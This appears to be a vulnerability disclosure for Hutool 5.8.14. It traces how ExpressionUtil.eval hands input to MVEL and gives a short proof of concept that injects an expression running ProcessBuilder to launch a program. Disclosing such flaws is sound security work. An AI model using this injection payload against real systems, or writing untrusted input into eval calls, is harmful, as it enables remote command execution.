Like hutool documents add dependency:
```java
<dependency>
    <groupId>cn.hutool</groupId>
    <artifactId>hutool-all</artifactId>
    <version>5.8.14</version>
</dependency>
```
**And mvel2 dependency**

```java
<!-- https://mvnrepository.com/artifact/org.mvel/mvel2 -->
<dependency>
      <groupId>org.mvel</groupId>
      <artifactId>mvel2</artifactId>
      <version>2.4.14.Final</version>
    </dependency>
```
As shown in the figure:
![image](https://user-images.githubusercontent.com/127066969/223008574-ad197c91-5b00-486c-aa02-ef9923dec8c3.png)


Vulnerability trigger analysis:

In `ExpressionUtil.class`:
```java
 public static ExpressionEngine getEngine() {
 //an interface `ExpressionEngine` is returned here.
        return ExpressionFactory.get();
    }

    public static Object eval(String expression, Map<String, Object> context) {
    //so getEngine().eval actually is the eval method of ExpressionEngine.
        return getEngine().eval(expression, context);
    }
```
The implementation class of `ExpressionEngine` is `MvelEngine`,
```java
public Object eval(String expression, Map<String, Object> context) {
        return MVEL.eval(expression, context);
    }
```
In the `eval` method, `MVEL` is used to execute regular expressions,after untrusted data is passed into the `eval` method,the expression injection vulnerability will be triggered.

POC:
```java
 public static void main(String[] args) {
        String mvel = "{(new java.lang.ProcessBuilder(\"calc\")).start()}";
        Map<String,Object> map2=new HashMap<>();
        map2.put("SoLikeDog", 1);
        ExpressionUtil.eval(mvel,map2);
    }
```
![image](https://user-images.githubusercontent.com/127066969/223008584-3330abe2-a265-4368-8650-b32f90dcab52.png)
